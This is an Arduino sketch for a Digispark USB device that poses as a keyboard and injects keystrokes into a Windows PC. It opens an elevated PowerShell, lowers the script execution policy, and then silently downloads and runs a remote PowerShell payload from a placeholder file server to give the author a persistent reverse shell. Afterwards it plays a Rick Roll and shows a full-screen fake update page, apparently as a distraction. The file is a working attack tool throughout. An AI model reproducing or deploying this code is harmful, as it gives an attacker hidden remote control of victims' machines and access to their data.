// This script downloads and executes a powershell script to provide a persistent reverse shell to our host.
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  /* Downloads and executes reverse shell payload */
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  
  /* Enable Running Scripts in Powershell*/
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell start-process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Set-ExecutionPolicy RemoteSigned");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("A");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  /* Download payload and run the payload to provide persistent reverse shell. This is kinda jank and may not work for all. */
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('[FILESERVER_ADRESS]/payload.ps1');\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  /* Pulls a Rick Roll and Fake Update for fun :) */
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("https://youtu.be/dQw4w9WgXcQ?t=43s");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("http://fakeupdate.net/win10ue");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_F11);

  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
